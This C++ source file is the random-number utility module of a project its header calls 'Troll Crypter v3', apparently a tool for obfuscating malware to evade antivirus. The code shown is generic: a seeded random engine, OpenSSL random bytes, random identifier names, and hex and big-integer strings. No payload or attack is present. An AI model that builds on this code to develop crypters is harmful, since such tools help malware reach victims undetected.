// Troll Crypter v3 - Mason Group / Freemasonry
// Developed by ABOLHB

#include "crypto/random.h"
#include <openssl/rand.h>
#include <algorithm>
#include <sstream>
#include <iomanip>

namespace troll {

std::mt19937_64& Random::engine() {
    static std::mt19937_64 eng([] {
        std::random_device rd;
        std::seed_seq seq{rd(), rd(), rd(), rd(), rd(), rd(), rd(), rd()};
        return std::mt19937_64(seq);
    }());
    return eng;
}

Bytes Random::bytes(size_t count) {
    Bytes buf(count);
    RAND_bytes(buf.data(), static_cast<int>(count));
    return buf;
}

int Random::range(int lo, int hi) {
    std::uniform_int_distribution<int> dist(lo, hi);
    return dist(engine());
}

uint64_t Random::bits(int num_bits) {
    if (num_bits <= 0) return 0;
    if (num_bits > 64) num_bits = 64;
    uint64_t mask = (num_bits == 64) ? ~0ULL : ((1ULL << num_bits) - 1);
    std::uniform_int_distribution<uint64_t> dist(1, mask);
    return dist(engine());
}

std::string Random::name(int min_len, int max_len) {
    static const char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    static const char alphanum[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    int len = range(min_len, max_len);
    std::string result;
    result += letters[range(0, sizeof(letters) - 2)];
    for (int i = 1; i < len; i++) {
        result += alphanum[range(0, sizeof(alphanum) - 2)];
    }
    return result;
}

std::string Random::hex_string(size_t byte_count) {
    auto b = bytes(byte_count);
    std::ostringstream ss;
    for (auto x : b) ss << std::hex << std::setfill('0') << std::setw(2) << (int)x;
    return ss.str();
}

std::string Random::bigint_string(int num_bits) {
    if (num_bits <= 64) {
        uint64_t val = bits(num_bits);
        if (val == 0) val = 1;
        return std::to_string(val);
    }

    int byte_count = (num_bits + 7) / 8;
    auto raw = bytes(byte_count);
    raw[0] |= 0x01;

    std::string result;
    std::vector<uint8_t> num(raw.begin(), raw.end());

    while (!num.empty()) {
        uint32_t remainder = 0;
        std::vector<uint8_t> quotient;
        for (auto b : num) {
            uint32_t dividend = remainder * 256 + b;
            uint8_t q = static_cast<uint8_t>(dividend / 10);
            remainder = dividend % 10;
            if (!quotient.empty() || q > 0) quotient.push_back(q);
        }
        result += static_cast<char>('0' + remainder);
        num = quotient;
    }

    std::reverse(result.begin(), result.end());
    if (result.empty()) result = "1";
    return result;
}

}
